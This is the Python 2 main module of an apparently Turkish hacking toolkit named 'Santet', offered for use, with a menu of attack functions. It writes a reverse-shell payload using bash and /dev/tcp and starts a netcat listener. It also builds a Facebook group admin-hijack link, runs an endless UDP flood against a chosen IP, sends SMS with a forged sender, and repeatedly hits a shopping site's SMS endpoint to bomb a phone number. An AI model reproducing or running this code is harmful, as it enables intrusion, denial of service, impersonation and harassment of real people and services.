## onlen.py - Main module of Santet
# -*- coding: utf-8 -*-
##
import os
import sys
import time
import socket
import random
import requests
from misc import *

netcatrat_banner = """
               _                  _                    _   
              ( )_               ( )_                 ( )_ 
  ___     __  | ,_)   ___    _ _ | ,_)    _ __    _ _ | ,_)
/' _ `\ /'__`\| |   /'___) /'_` )| |     ( '__) /'_` )| |  
| ( ) |(  ___/| |_ ( (___ ( (_| || |_    | |   ( (_| || |_ 
(_) (_)`\____)`\__)`\____)`\__,_)`\__)   (_)   `\__,_)`\__)
"""
facebookgrouphijack_banner = """
   
FFFFFFF   BBBBBBBB
F                 B               B
FFFFFFF    BBBBBBBB
F                  B               B
F                  BBBBBBBB

SSSS    V                   V    L       H           H   CCCCCC  K     K
S             V              V       L       H           H   C               K K
SSSS        V         V          L       HHHHHH  C               KK
       S          V    V             L       H            H  C               KK
SSSS             V                L       H            H  CCCCCC  K    K                         

"""
smsbomber_banner = """
                           
SSSSS   MM       MM   SSSSSS
S            M    MM   M   S                
SSSSS  M              M    SSSSSS              
         S  M              M                S           
SSSSS M              M     SSSSSS

SSSS    V                   V    L       H           H   CCCCCC  K     K
S             V              V       L       H           H   C               K K
SSSS        V         V          L       HHHHHH  C               KK
       S          V    V             L       H            H  C               KK
SSSS             V                L       H            H  CCCCCC  K    K                         
                      
"""
smsspoofelk_banner = """
SSSSS   MM       MM   SSSSSS
S            M    MM   M   S                
SSSSS  M              M    SSSSSS              
         S  M              M                S           
SSSSS M              M     SSSSSS

SSSS    V                   V    L       H           H   CCCCCC  K     K
S             V              V       L       H           H   C               K K
SSSS        V         V          L       HHHHHH  C               KK
       S          V    V             L       H            H  C               KK
SSSS             V                L       H            H  CCCCCC  K    K                         
"""
denialofserviceattack_banner = ""


DDDDDD       DDDDDD     OOOOOO       SSSSSS
D            D     D            D    O           O       S
D              D   D              D  O           O       SSSSSS
D           D      D            D    O           O                   S
DDDDD         DDDDD        OOOOOO       SSSSSS            

SSSS    V                   V    L       H           H   CCCCCC  K     K
S             V              V       L       H           H   C               K K
SSSS        V         V          L       HHHHHH  C               KK
       S          V    V             L       H            H  C               KK
SSSS             V                L       H            H  CCCCCC  K    K                         
  

"" 
                                                      
 






"""

def netcat_rat():
	print netcatrat_banner
	nccheck = os.system("which nc")
	if nccheck != 0:
		print "[-] Netcat not installed yet!!!"
		backtomenu_option()
	else:
		netcatrat_menu()
		netcatrat = raw_input("santet > ")
		if netcatrat.strip() in "01 1".split():
			host = raw_input("\nsantet > Web Sitesi Url:")
			port = raw_input("santet > Web Sitesi Port: ")
			output = raw_input("santet > set OUTPUT ")
			try:
				file = open(output, 'w')
				file.write("bash -i > /dev/tcp/%s/%s 0<&1 2>&1" % (host,port))
				file.close()
				slistener = raw_input("\Liste Olusturulsunmu? [Y/n] ")
				if slistener.strip() in "y Y".split():
					port = raw_input("\nsantet > Port: ")
					print
					os.system("nc -l -p %s" %port)
					backtomenu_option()
				elif slistener.strip() in "n N".split():
					backtomenu_option()
				else:
					print
			except IOError, e:
				print "\nERROR:",e
				backtomenu_option()
		elif netcatrat.strip() in "02 2".split():
			port = raw_input("\nPort: ")
			print
			os.system("nc -l -p %s" %port)
			backtomenu_option()
		else:
			print "\nERROR: Katagoride Bulunmadi"
			time.sleep(2)
			restart_program()

def facebookgroup_hijack():
	print facebookgrouphijack_banner
	id_group = raw_input("Grub ID [Ornek: 15757846897878]: ")
	id_user = raw_input("Kullanici ID [Ornek: 100004136748473]: ")
	time.sleep(1.5)
	linkjack = 'https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange' % (id_group, id_user)
	print "[+] LINKJACK >>> https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (id_group, id_user)
	
	try:
		file = open("fbghack.txt", 'w')
		file.write(linkjack)
		file.close()
		print "[+] fbghack.txt dosyas?na Kaydedildi. Acmak icin cat fbghack.txt"
		backtomenu_option()
	except IOError, e:
		print "\nERROR:",e
		backtomenu_option()

def denialofservice_attack():
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1490)
	print denialofserviceattack_banner
	ip = raw_input("santet > IP Giriniz ")
	port = input("santet > Port Giriniz ")
	print "\n[~] Saldiri Basliyor\n"
	time.sleep(2.5)
	sent = 0
	while True:
		sock.sendto(bytes, (ip,port))
		sent = sent + 1
		port = port + 1
		print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
		if port == 65534:
			port = 1

def sms_spoof_elk():
	print smsspoofelk_banner
	usernm = raw_input("Kullanici Ad: ")
	passwd = raw_input("Sifre: ")
	recipient = raw_input("Konu:")
	sender = raw_input("Aciklama: ")
	messagetext = raw_input("Mesaj: ")
	url = "https://api.46elks.com/a1/SMS"
	r = requests.post(url, data={'to': recipient,'from': sender,'message': messagetext}, auth=(usernm, passwd))
	print r.json()
	backtomenu_option()

def sms_bomber_jdid():
	print smsbomber_banner
	phone_number = raw_input("Telefon Numarasi: ")
	countx = raw_input("Konu: ")
	countx = int(countx)
	param = {'phone':''+phone_number,'smsType':'1'}
	count = 0
	while (count < countx):
		r = requests.post('http://sc.jd.id/phone/sendPhoneSms', data=param)
		if '"success":true' in r.text:
			print("\n\033[1;32m[  OK  ] Basariyla SMS G�nderildi.... Lutfen Bekleyiniz\033[0m")
		else:
			print("\n\033[1;31m[FAILED] SMS Gonderme Basarasiz...\033[0m")
		time.sleep(1)
		count = count + 1
	print("\033[1;33m[ DONE ] SMS Durdu\033[0m")
	backtomenu_option()